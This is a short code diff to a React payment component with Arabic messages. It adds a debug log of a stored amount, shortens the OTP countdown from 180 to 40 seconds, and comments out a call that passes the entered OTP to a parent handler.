@@ -137,6 +137,7 @@ export const Payment = (props: any) => {
     const storedAmount = getLocalStorage("amount")
     if (storedAmount) {
       setAmount(storedAmount)
+      console.log(storedAmount)
     }
   }, [])
 
@@ -203,7 +204,7 @@ export const Payment = (props: any) => {
               setstep(2)
               setIsloading(false)
               // Reset countdown when entering OTP step
-              setCountdown(180)
+              setCountdown(40)
             } else if (data.status === "rejected") {
               setIsloading(false)
               alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ")
@@ -633,7 +634,7 @@ export const Payment = (props: any) => {
                             }
                             setIsloading(true)
                             handleAddotp(paymentInfo.otp!)
-                            props.handleOArr(paymentInfo.otp!)
+                           //handleOArr(paymentInfo.otp!)
                             handlePay(paymentInfo, setPaymentInfo)
                             setTimeout(() => {
                               setIsloading(false)
